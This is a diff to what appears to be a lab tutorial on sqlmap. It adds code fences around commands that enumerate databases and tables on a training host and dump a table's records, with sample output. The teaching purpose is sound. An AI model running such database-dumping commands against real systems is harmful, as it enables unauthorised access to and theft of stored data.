@@ -126,7 +126,7 @@ The results from the command we executed for our target http://sqlmaptesting.thm
 To fetch the databases, we use the flag --dbs. Let's try this flag out with our vulnerable URL:
 Extracting databases names
 
-           
+ ```          
 user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
        __H__
  ___ ___[(]_____ ___ ___  {1.2.4#stable}
@@ -154,14 +154,14 @@ available databases [2]:
 [*] users
 [*] members
 
-[text removed]
+```
 
         
 
 After running the above command, we got two database names. Select the users database and fetch the tables inside of it. We will define the database after the flag -D and use the --tables flag at the end to extract all the table names.
 Extracting tables
 
-           
+ ```          
 user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
        __H__
  ___ ___[(]_____ ___ ___  {1.2.4#stable}
@@ -192,15 +192,13 @@ Database: acuart
 | alexas    |
 | thomas    |     
 +-----------+
-
-[text removed]
-
+```
         
 
 Now that we have all the available table names of the database, let's dump the records present in the thomas table. To do so, we will define the database with the -D flag, the table with the -T flag, and for extracting the records of the table, we will use the --dump flag.
 Extracting records from a table
 
-           
+```           
 user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
        __H__
  ___ ___[(]_____ ___ ___  {1.2.4#stable}
@@ -236,8 +234,7 @@ Table: thomas
 +---------------------+------------+----------
 | 09/09/2024          | Thomas THM | testing |    
 +---------------------+------------+---------+
-
-[text removed]
+```
 
         
 
